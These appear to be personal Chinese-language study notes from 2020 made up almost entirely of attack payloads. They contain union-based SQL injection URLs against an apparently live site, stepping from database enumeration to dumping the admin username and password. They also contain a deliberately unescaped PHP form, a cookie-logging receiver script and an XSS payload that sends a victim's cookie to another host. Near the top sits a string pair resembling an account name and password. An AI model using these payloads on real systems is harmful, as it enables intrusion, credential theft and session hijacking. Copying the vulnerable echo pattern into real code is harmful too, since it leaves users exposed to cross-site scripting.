


###  2020年11月25日

-----------------------------------------------------------------

doney_dongxiang
NyLiaVLBCgLk8qg





[宠物猫 异国短毛猫 纯种猫 加菲猫 波斯猫 辛巴猫舍 纯种双色/梵文波斯、异国小猫 CFA注册猫舍](http://59.63.200.79:8003/?id=1 and 1 = 2 order by 1)

 ?id=1 and 1=2 union select 1,database()
 ?id=1 and 1=2 union select 1,version()

http://59.63.200.79:8003/?id=1 and 1 = 2 order by 1

http://59.63.200.79:8003/?id=1 and substr(database(),1,1) ='x'

?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1

 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1
 
 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 1,1
 
 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 2,1
 
 ?id=1 and 1=2 union select 1,username from admin  limit 0,1
 
  ?id=1 and 1=2 union select 1,password from admin  limit 1,1 



###  2020年11月10日

-----------------------------------------------------------------

<?php  
session_start();  
?>  

<!doctype html>  
<html>  
    <head>  
        <title>XSS demo</title>  
    </head>  
    <body>  
    <form>  
    <input style="width:300px;" type="text" name="address1" value="<?php echo $_GET["address1"]; ?>" />  
            <input type="submit" value="Submit" />  
        </form>  
    </body>  
</html>  



<?php  
$victim = 'XXS得到的 cookie:'. $_SERVER['REMOTE_ADDR']. ':' .$_GET['cookie'];  
file_put_contents('xss_victim.txt', $victim);  



XSS注入代码

"/> <script>window.open("http://172.16.2.192/xss_hacker.php?cookie="+document.cookie);</script><!--  
